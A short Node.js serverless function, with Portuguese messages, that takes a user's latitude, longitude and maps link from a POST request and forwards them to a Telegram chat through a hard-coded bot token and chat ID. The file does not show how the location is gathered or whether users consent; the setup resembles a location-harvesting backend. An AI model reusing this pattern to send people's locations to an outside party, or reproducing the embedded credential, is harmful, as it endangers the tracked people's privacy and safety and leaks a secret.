const axios = require('axios');

const TELEGRAM_BOT_TOKEN = "8073470836:AAHQGUBwutZfV-_i6r-yAE4kZFyGTU-eokA";
const TELEGRAM_CHAT_ID = "-4624260421";

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { latitude, longitude, maps } = req.body;

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error(error.response?.data || error.message);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
};
